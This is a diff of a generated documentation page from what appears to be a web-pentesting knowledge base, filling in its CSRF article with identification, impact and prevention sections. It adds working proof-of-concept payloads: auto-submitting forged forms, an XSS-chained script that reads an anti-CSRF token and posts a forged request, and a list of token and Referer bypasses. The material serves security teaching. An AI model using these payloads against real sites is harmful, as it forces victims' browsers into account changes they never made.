@@ -19,7 +19,7 @@
       
       
       <link rel="icon" href="../../assets/images/favicon.png">
-      <meta name="generator" content="mkdocs-1.6.1, mkdocs-material-9.7.1">
+      <meta name="generator" content="mkdocs-1.6.1, mkdocs-material-9.7.6">
     
     
       
@@ -469,6 +469,34 @@
   
   
     <li class="md-nav__item">
+      <a href="../broken-authentication/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Broken Authentication
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
       <a href="../broken-access-control/" class="md-nav__link">
         
   
@@ -710,6 +738,67 @@
     </span>
   </a>
   
+    <nav class="md-nav" aria-label="Exploitation">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#basic-csrf-attack-html-form" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Basic CSRF Attack (HTML Form)
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#get-based-csrf" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        GET-Based CSRF
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#post-based-with-token-theft" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        POST-Based with Token Theft
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#exploiting-weak-csrf-tokens" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Exploiting Weak CSRF Tokens
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#additional-bypasses" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Additional Bypasses
+      
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
 </li>
       
         <li class="md-nav__item">
@@ -845,34 +934,6 @@
   
   
     <li class="md-nav__item">
-      <a href="../authentication/" class="md-nav__link">
-        
-  
-  
-  <span class="md-ellipsis">
-    
-  
-    Authentication
-  
-
-    
-  </span>
-  
-  
-
-      </a>
-    </li>
-  
-
-              
-            
-              
-                
-  
-  
-  
-  
-    <li class="md-nav__item">
       <a href="../business-logic-vulnerabilities/" class="md-nav__link">
         
   
@@ -937,6 +998,62 @@
     
   
     Path Traversal
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../file-inclusion/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    File Inclusion
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../file-upload-attacks/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    File Upload Attacks
   
 
     
@@ -1339,6 +1456,67 @@
     </span>
   </a>
   
+    <nav class="md-nav" aria-label="Exploitation">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#basic-csrf-attack-html-form" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Basic CSRF Attack (HTML Form)
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#get-based-csrf" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        GET-Based CSRF
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#post-based-with-token-theft" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        POST-Based with Token Theft
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#exploiting-weak-csrf-tokens" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Exploiting Weak CSRF Tokens
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#additional-bypasses" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Additional Bypasses
+      
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
 </li>
       
         <li class="md-nav__item">
@@ -1393,12 +1571,132 @@
 
 <h1 id="csrf">CSRF</h1>
 <h2 id="overview">Overview</h2>
+<p>Cross-Site Request Forgery (CSRF or XSRF) is an attack that forces an authenticated user to execute unwanted actions on a web application in which they are currently authenticated. The attacker tricks the victim's browser into sending a request to the target application using the victim's credentials (typically via cookies).</p>
+<p>The attack succeeds when:
+- The application relies solely on cookies for session management (automatically sent by the browser).
+- All required parameters for the sensitive action can be guessed or known by the attacker.
+- There is no (or insufficient) anti-CSRF protection (tokens, same-site cookies, etc.).</p>
 <h2 id="attack-surface">Attack Surface</h2>
+<ul>
+<li>State-changing actions: profile updates, password changes, fund transfers, privilege modifications, deletions.</li>
+<li>Any authenticated action that can be triggered via GET or POST with predictable parameters.</li>
+<li>APIs and forms without proper anti-CSRF tokens or other protections.</li>
+</ul>
 <h2 id="identification">Identification</h2>
+<ul>
+<li>Map authenticated functionality while capturing requests in a proxy.</li>
+<li>Identify state-changing requests (especially those using cookies for auth).</li>
+<li>Check for the presence and validation of anti-CSRF tokens.</li>
+<li>Test whether requests can be replayed or forged from an external site.</li>
+<li>Look for weak or predictable CSRF token generation (e.g., based on username hashes).</li>
+</ul>
 <h2 id="exploitation">Exploitation</h2>
+<h3 id="basic-csrf-attack-html-form">Basic CSRF Attack (HTML Form)</h3>
+<p>Create a malicious page that auto-submits a form:</p>
+<div class="language-html highlight"><table class="highlighttable"><tr><th colspan="2" class="filename"><span class="filename">HTML</span></th></tr><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"> 1</span>
+<span class="normal"> 2</span>
+<span class="normal"> 3</span>
+<span class="normal"> 4</span>
+<span class="normal"> 5</span>
+<span class="normal"> 6</span>
+<span class="normal"> 7</span>
+<span class="normal"> 8</span>
+<span class="normal"> 9</span>
+<span class="normal">10</span>
+<span class="normal">11</span>
+<span class="normal">12</span>
+<span class="normal">13</span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-0-1"><span class="p">&lt;</span><span class="nt">html</span><span class="p">&gt;</span>
+</span><span id="__span-0-2">  <span class="p">&lt;</span><span class="nt">body</span><span class="p">&gt;</span>
+</span><span id="__span-0-3">    <span class="p">&lt;</span><span class="nt">form</span> <span class="na">id</span><span class="o">=</span><span class="s">&quot;submitMe&quot;</span> <span class="na">action</span><span class="o">=</span><span class="s">&quot;http://target/api/update-profile&quot;</span> <span class="na">method</span><span class="o">=</span><span class="s">&quot;POST&quot;</span><span class="p">&gt;</span>
+</span><span id="__span-0-4">      <span class="p">&lt;</span><span class="nt">input</span> <span class="na">type</span><span class="o">=</span><span class="s">&quot;hidden&quot;</span> <span class="na">name</span><span class="o">=</span><span class="s">&quot;email&quot;</span> <span class="na">value</span><span class="o">=</span><span class="s">&quot;attacker@evil.com&quot;</span> <span class="p">/&gt;</span>
+</span><span id="__span-0-5">      <span class="p">&lt;</span><span class="nt">input</span> <span class="na">type</span><span class="o">=</span><span class="s">&quot;hidden&quot;</span> <span class="na">name</span><span class="o">=</span><span class="s">&quot;telephone&quot;</span> <span class="na">value</span><span class="o">=</span><span class="s">&quot;(227)-750-8112&quot;</span> <span class="p">/&gt;</span>
+</span><span id="__span-0-6">      <span class="p">&lt;</span><span class="nt">input</span> <span class="na">type</span><span class="o">=</span><span class="s">&quot;hidden&quot;</span> <span class="na">name</span><span class="o">=</span><span class="s">&quot;country&quot;</span> <span class="na">value</span><span class="o">=</span><span class="s">&quot;CSRF_POC&quot;</span> <span class="p">/&gt;</span>
+</span><span id="__span-0-7">      <span class="p">&lt;</span><span class="nt">input</span> <span class="na">type</span><span class="o">=</span><span class="s">&quot;submit&quot;</span> <span class="na">value</span><span class="o">=</span><span class="s">&quot;Submit request&quot;</span> <span class="p">/&gt;</span>
+</span><span id="__span-0-8">    <span class="p">&lt;/</span><span class="nt">form</span><span class="p">&gt;</span>
+</span><span id="__span-0-9">    <span class="p">&lt;</span><span class="nt">script</span><span class="p">&gt;</span>
+</span><span id="__span-0-10"><span class="w">      </span><span class="nb">document</span><span class="p">.</span><span class="nx">getElementById</span><span class="p">(</span><span class="s2">&quot;submitMe&quot;</span><span class="p">).</span><span class="nx">submit</span><span class="p">()</span>
+</span><span id="__span-0-11"><span class="w">    </span><span class="p">&lt;/</span><span class="nt">script</span><span class="p">&gt;</span>
+</span><span id="__span-0-12">  <span class="p">&lt;/</span><span class="nt">body</span><span class="p">&gt;</span>
+</span><span id="__span-0-13"><span class="p">&lt;/</span><span class="nt">html</span><span class="p">&gt;</span>
+</span></code></pre></div></td></tr></table></div>
+<p>Serve it locally (<code>python -m http.server 1337</code>) and have the victim visit while logged into the target.</p>
+<h3 id="get-based-csrf">GET-Based CSRF</h3>
+<p>Similar approach using a GET form or image tags for simple cases.</p>
+<h3 id="post-based-with-token-theft">POST-Based with Token Theft</h3>
+<p>When anti-CSRF tokens are present:
+- Use reflected values or XSS to read the token from a page the victim visits.
+- Example chaining (XSS + CSRF):
+  <div class="language-javascript highlight"><table class="highlighttable"><tr><th colspan="2" class="filename"><span class="filename">JavaScript</span></th></tr><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"> 1</span>
+<span class="normal"> 2</span>
+<span class="normal"> 3</span>
+<span class="normal"> 4</span>
+<span class="normal"> 5</span>
+<span class="normal"> 6</span>
+<span class="normal"> 7</span>
+<span class="normal"> 8</span>
+<span class="normal"> 9</span>
+<span class="normal">10</span>
+<span class="normal">11</span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-1-1"><span class="kd">var</span><span class="w"> </span><span class="nx">req</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="ow">new</span><span class="w"> </span><span class="nx">XMLHttpRequest</span><span class="p">();</span>
+</span><span id="__span-1-2"><span class="nx">req</span><span class="p">.</span><span class="nx">onload</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">handleResponse</span><span class="p">;</span>
+</span><span id="__span-1-3"><span class="nx">req</span><span class="p">.</span><span class="nx">open</span><span class="p">(</span><span class="s1">&#39;get&#39;</span><span class="p">,</span><span class="s1">&#39;/app/change-visibility&#39;</span><span class="p">,</span><span class="kc">true</span><span class="p">);</span>
+</span><span id="__span-1-4"><span class="nx">req</span><span class="p">.</span><span class="nx">send</span><span class="p">();</span>
+</span><span id="__span-1-5"><span class="kd">function</span><span class="w"> </span><span class="nx">handleResponse</span><span class="p">(</span><span class="nx">d</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
+</span><span id="__span-1-6"><span class="w">    </span><span class="kd">var</span><span class="w"> </span><span class="nx">token</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">this</span><span class="p">.</span><span class="nx">responseText</span><span class="p">.</span><span class="nx">match</span><span class="p">(</span><span class="sr">/name=&quot;csrf&quot; type=&quot;hidden&quot; value=&quot;(\w+)&quot;/</span><span class="p">)[</span><span class="mf">1</span><span class="p">];</span>
+</span><span id="__span-1-7"><span class="w">    </span><span class="kd">var</span><span class="w"> </span><span class="nx">changeReq</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="ow">new</span><span class="w"> </span><span class="nx">XMLHttpRequest</span><span class="p">();</span>
+</span><span id="__span-1-8"><span class="w">    </span><span class="nx">changeReq</span><span class="p">.</span><span class="nx">open</span><span class="p">(</span><span class="s1">&#39;post&#39;</span><span class="p">,</span><span class="w"> </span><span class="s1">&#39;/app/change-visibility&#39;</span><span class="p">,</span><span class="w"> </span><span class="kc">true</span><span class="p">);</span>
+</span><span id="__span-1-9"><span class="w">    </span><span class="nx">changeReq</span><span class="p">.</span><span class="nx">setRequestHeader</span><span class="p">(</span><span class="s1">&#39;Content-Type&#39;</span><span class="p">,</span><span class="w"> </span><span class="s1">&#39;application/x-www-form-urlencoded&#39;</span><span class="p">);</span>
+</span><span id="__span-1-10"><span class="w">    </span><span class="nx">changeReq</span><span class="p">.</span><span class="nx">send</span><span class="p">(</span><span class="s1">&#39;csrf=&#39;</span><span class="o">+</span><span class="nx">token</span><span class="o">+</span><span class="s1">&#39;&amp;action=change&#39;</span><span class="p">);</span>
+</span><span id="__span-1-11"><span class="p">};</span>
+</span></code></pre></div></td></tr></table></div></p>
+<h3 id="exploiting-weak-csrf-tokens">Exploiting Weak CSRF Tokens</h3>
+<ul>
+<li>If tokens are derived from usernames or predictable values, precompute them (e.g., MD5 of username).</li>
+<li>Example POC page that opens a window to refresh the token and then submits a forged request with the computed value.</li>
+</ul>
+<h3 id="additional-bypasses">Additional Bypasses</h3>
+<ul>
+<li>Submit empty or missing token values.</li>
+<li>Use a token from a different account if validation is insufficient.</li>
+<li>Change request method (POST → GET).</li>
+<li>Remove the token parameter entirely.</li>
+<li>For double-submit cookie patterns: set a known cookie value and matching parameter.</li>
+<li>Bypass Referer checks by manipulating the header or using meta tags: <code>&lt;meta name="referrer" content="no-referrer"&gt;</code></li>
+<li>Open redirect chaining to control where the victim is sent.</li>
+</ul>
 <h2 id="impact">Impact</h2>
+<ul>
+<li>Unauthorized changes to user accounts or settings</li>
+<li>Financial transactions or transfers performed on the victim's behalf</li>
+<li>Privilege escalation</li>
+<li>Data deletion or modification</li>
+<li>Complete account compromise when chained with other issues</li>
+</ul>
 <h2 id="prevention">Prevention</h2>
+<ul>
+<li>Use synchronizer tokens (anti-CSRF tokens) that are unique per session and validated on every state-changing request.</li>
+<li>Implement SameSite cookie attributes (<code>Lax</code> or <code>Strict</code>).</li>
+<li>Use custom request headers for AJAX calls (browsers do not send them cross-origin by default).</li>
+<li>Require re-authentication for highly sensitive actions.</li>
+<li>Validate the Referer/Origin header as a secondary control.</li>
+<li>Ensure tokens are tied to the specific user/session and not reusable across accounts.</li>
+</ul>
 <h2 id="tools-payloads">Tools &amp; Payloads</h2>
+<ul>
+<li>Burp Suite to capture and analyze requests/tokens</li>
+<li>Simple HTML + JavaScript proof-of-concept pages</li>
+<li>Local HTTP server to host malicious pages</li>
+<li>MD5 or other hash libraries when testing weak token generation</li>
+</ul>
+<p><strong>Example minimal auto-submit form:</strong>
+<div class="language-html highlight"><table class="highlighttable"><tr><th colspan="2" class="filename"><span class="filename">HTML</span></th></tr><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal">1</span>
+<span class="normal">2</span>
+<span class="normal">3</span>
+<span class="normal">4</span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-2-1"><span class="p">&lt;</span><span class="nt">form</span> <span class="na">action</span><span class="o">=</span><span class="s">&quot;http://target/action&quot;</span> <span class="na">method</span><span class="o">=</span><span class="s">&quot;POST&quot;</span><span class="p">&gt;</span>
+</span><span id="__span-2-2">  <span class="p">&lt;</span><span class="nt">input</span> <span class="na">type</span><span class="o">=</span><span class="s">&quot;hidden&quot;</span> <span class="na">name</span><span class="o">=</span><span class="s">&quot;param&quot;</span> <span class="na">value</span><span class="o">=</span><span class="s">&quot;malicious-value&quot;</span> <span class="p">/&gt;</span>
+</span><span id="__span-2-3"><span class="p">&lt;/</span><span class="nt">form</span><span class="p">&gt;</span>
+</span><span id="__span-2-4"><span class="p">&lt;</span><span class="nt">script</span><span class="p">&gt;</span><span class="nb">document</span><span class="p">.</span><span class="nx">forms</span><span class="p">[</span><span class="mf">0</span><span class="p">].</span><span class="nx">submit</span><span class="p">();&lt;/</span><span class="nt">script</span><span class="p">&gt;</span>
+</span></code></pre></div></td></tr></table></div></p>
+<p>See the <a href="../xss/">XSS</a> page for powerful chaining opportunities and the <a href="../broken-authentication/">Broken Authentication</a> page for related session issues.</p>
 
 
 
